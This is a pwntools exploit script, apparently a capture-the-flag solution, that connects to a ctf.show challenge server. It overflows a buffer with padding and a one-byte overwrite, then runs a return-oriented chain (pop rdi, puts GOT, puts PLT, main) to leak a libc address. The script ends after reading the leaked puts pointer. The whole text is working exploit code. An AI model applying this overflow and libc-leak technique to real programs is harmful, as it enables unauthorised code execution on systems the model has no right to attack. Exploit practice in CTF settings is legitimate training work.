from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28251)
elf = ELF('./pwn')
libc = ELF("/home/bit/libc/64bit/libc-2.27.so")
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401ba3 # 0x0000000000401ba3 : pop rdi ; ret
payload = 'a' * 0x418 + p8(0x28)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(main)
io.sendlineafter('>> ', payload)
puts = u64(io.recvuntil('\x7f')[-6:] + '\x00\x00')
